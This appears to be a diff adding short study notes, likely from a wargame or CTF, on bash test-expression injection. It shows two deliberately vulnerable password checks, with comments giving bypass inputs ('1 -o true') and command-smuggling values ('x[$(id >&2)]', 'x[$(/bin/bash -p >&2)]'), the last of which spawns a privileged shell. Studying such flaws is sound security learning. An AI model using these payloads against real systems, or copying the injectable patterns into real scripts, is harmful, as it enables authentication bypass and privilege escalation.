@@ -1,0 +1,9 @@
+## unquoted expression injection
+PASS=$(cat .passwd) 
+if test $PASS -eq ${1} 2>/dev/null; then					# "1 -o true"
+										# "0 -o foo"
+
+## -v evaluate expression
+PASS=$(cat .passwd)
+if [ ! -v "$1" ]; then								# 'x[$(id >&2)]'
+										# 'x[$(/bin/bash -p >&2)]'
